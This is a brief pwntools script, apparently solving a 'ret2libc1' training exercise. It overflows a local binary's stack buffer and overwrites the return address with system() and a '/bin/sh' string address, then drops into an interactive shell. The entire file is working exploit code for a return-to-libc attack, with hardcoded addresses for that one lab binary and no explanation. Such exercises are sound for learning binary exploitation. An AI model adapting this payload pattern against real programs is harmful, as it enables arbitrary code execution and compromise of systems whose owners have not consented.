from pwn import *

offset = 0x6c + 4
bin_sh_addr = 0x08048720
system_addr = 0x08048460

payload = offset * b'A' \
        + p32(system_addr) \
        + p32(0xAAAAAAAA) \
        + p32(bin_sh_addr)   
        
sh = process("./ret2libc1")
sh.sendline(payload)
sh.interactive()
